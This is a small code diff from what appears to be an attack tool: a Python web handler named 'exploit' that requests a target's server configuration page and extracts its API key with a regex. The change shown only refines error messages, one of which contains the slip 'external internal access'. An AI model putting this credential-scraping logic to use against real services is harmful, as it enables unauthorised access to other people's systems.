@@ -193,16 +193,23 @@ async def exploit(request: web.Request) -> web.Response:
         print(f"[-] Connection Error to Server Config Page, {e}")
         return web.json_response({
             "status": 500,
-            "message": f"Failed to get Server Config page due to a Connection Error. Is the Server online?",
+            "message": "Failed to get Server Config page due to a Connection Error. Is the Server online?",
             "error": str(e)
         })
 
     if not server_settings.ok:
-        print(f"[-] Server Config Page returned an error, {server_settings.status_code}")
-        return web.json_response({
-            "status": 500,
-            "message": f"Failed to get Server Config page, {server_settings.status_code}."
-        })
+        if "External internet access denied" in server_settings.text:
+            print("[-] Target Web UI has external internal access disabled")
+            return web.json_response({
+                "status": 400,
+                "message": "Target Web UI has external internal access disabled, cannot do anything."
+            })
+        else:
+            print(f"[-] Server Config Page returned an error, {server_settings.status_code}")
+            return web.json_response({
+                "status": 500,
+                "message": f"Failed to get Server Config page, {server_settings.status_code}."
+            })
 
     api_key = re.search(r'"apikey" value="([a-f0-9]{32})"', server_settings.text)  # 3.x
     if not api_key:
